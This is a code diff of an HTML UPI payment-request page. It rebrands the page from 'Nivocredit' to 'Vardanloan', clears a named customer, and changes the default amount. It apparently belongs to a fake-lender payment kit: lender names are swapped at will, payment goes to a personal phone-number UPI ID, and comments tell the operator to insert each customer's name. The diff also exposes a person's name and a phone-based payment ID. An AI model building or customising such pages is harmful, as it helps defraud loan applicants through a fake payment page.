@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Nimocredit application- Payment Gateway</title>
+  <title>Vardanloan application- Payment Gateway</title>
   <style>
     * { box-sizing: border-box; font-family: Arial, sans-serif; }
     body {
@@ -75,7 +75,7 @@
 <body>
 
   <div class="payment-card">
-    <h2>Nivocredit</h2>
+    <h2>Vardanloan</h2>
     <div class="sub-title">Secure UPI Payment Request</div>
 
     <div class="details-box">
@@ -100,16 +100,16 @@
   <script>
     // ==========================================
     // 1. FILE KE ANDAR SE CUSTOMER NAME CHANGE KAREIN:
-    const CUSTOMER_NAME = "Abishek maji"; // Yahan naam badlein
+    const CUSTOMER_NAME = " "; // Yahan naam badlein
     
     // 2. AAPKI UPI ID AUR BUSINESS NAME:
     const UPI_ID = "7004738614@mbk";
-    const BUSINESS_NAME = "Nivocredit";
+    const BUSINESS_NAME = "Vardanloan";
     // ==========================================
 
     // Dynamic Amount fetch karne ke liye (URL parameter se)
     const urlParams = new URLSearchParams(window.location.search);
-    let amount = urlParams.get('amount') || "9500"; // Default amount 100 agar link me na ho
+    let amount = urlParams.get('amount') || "5500"; // Default amount 100 agar link me na ho
 
     document.getElementById('displayName').innerText = CUSTOMER_NAME;
     document.getElementById('displayAmount').innerText = amount;
